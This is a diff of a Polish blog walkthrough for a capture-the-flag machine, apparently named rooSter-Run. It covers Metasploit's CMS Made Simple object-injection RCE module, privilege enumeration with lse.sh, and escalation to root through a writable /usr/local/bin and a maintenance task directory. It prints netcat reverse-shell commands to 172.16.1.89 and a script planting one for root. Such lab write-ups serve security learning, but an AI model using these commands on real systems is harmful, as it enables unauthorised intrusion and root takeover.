@@ -129,7 +129,7 @@ Matching Modules
 
 Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce
 ```
-Wybieramy __multi/http/cmsms_object_injection_rce__:
+Wybieramy **multi/http/cmsms_object_injection_rce**:
 ```bash
 msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
 username => admin
@@ -153,11 +153,30 @@ msf6 exploit(multi/http/cmsms_object_injection_rce) >
 W w/w eksploicie jest wymagane podania loginu i hasła, ale za to mamy dostęp do **Shella**.
 {: .text-justify}
 # 05. Użytkownik www-data
-Wchodząc na shella działamy na użytkowniku **www-data**, ale jest jeszcze drugi "ludź" w katalogu **home** - **matthieu**. Trochę autor powrzucał na maszynę króliczych nor i różnej maści zmyłek, ale ważny jest skrypt **StaleFinder** i katalog **/usr/local/bin**. Jest on pusty, co nasuwa pewne przypuszczenie.
+Wchodząc na shella działamy na użytkowniku **www-data**, ale jest jeszcze drugi "ludź" w katalogu **home** - **matthieu**. Trochę autor powrzucał na maszynę króliczych nor i różnej maści zmyłek, ale ważny jest skrypt **StaleFinder** i katalog **/usr/local/bin**. Jest on pusty, co nasuwa pewne przypuszczenie. A znalazłem ten katalog za pomocą program **Lse**. Wystarczy ściągnąć i uruchomić.
+```bash
+wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" && chmod 700 lse.sh && ./lse.sh -l 1
+```
 {: .text-justify}
 ```bash
-www-data@rooSter-Run:/home/matthieu$ getfacl /usr/local/bin
+...
+[!] fst160 Can we write to critical files?................................. nope
+[!] fst170 Can we write to critical directories?........................... nope
+[!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
+---
+drwxrwx---+ 2 root root 4096 Nov 28 23:32 /usr/local/bin
+---
+[!] fst190 Can we read any backup?......................................... nope
+[!] fst200 Are there possible credentials in any shell history file?....... nope
+[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
+[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
+...
+```
+Przyjrzyjmy się bardziej **/usr/local/bin**:
+{: .text-justify}
+```bash
 getfacl /usr/local/bin
+```
 getfacl: Removing leading '/' from absolute path names
 # file: usr/local/bin
 # owner: root
@@ -207,11 +226,7 @@ Zawartość pliku:
 nc -c /bin/bash 172.16.1.89 12345
 ```
 # 05. Użytkownik matthieu
-Będąc już na koncie **matthieu** odpalamy program **Lse** (wcześniej też to było zalecane, żeby znaleźć ciekawą ścieżkę **/usr/local/bin**).
-```bash
-wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" && chmod 700 lse.sh && ./lse.sh -l 1
-```
-Poniżej jest interesujący nas fragment:
+Będąc już na koncie **matthieu** odpalamy wcześniej pobrany program **Lse**. Poniżej jest interesujący nas fragment:
 {: .text-justify}
 ![03](/assets/images/hacking/2023/05/03.png)
 {: .text-justify}
@@ -252,5 +267,5 @@ echo '#!/bin/sh' > $PREPROD/file.sh
 echo 'nc -c /bin/sh 172.16.1.89 44444' >> $PREPROD/file.sh
 chmod +x $PREPROD/file.sh
 ```
-Później wejdź do katalogu **/opt/maintenance/prod-tasks** i czekaj aż tam będzie **file.sh**. Następną operacją jest zmiana nazwy komendą **mv**. *mv file.sh file*. Po niecałej minucie powinieneś mieć dostęp do konta **Root**.
+Później wejdź do katalogu **/opt/maintenance/prod-tasks** i czekaj aż tam będzie **file.sh**. Następną operacją jest zmiana nazwy komendą **mv**. *mv file.sh file*. Po niecałej minucie powinieneś mieć dostęp do konta **root**.
 {: .text-justify}
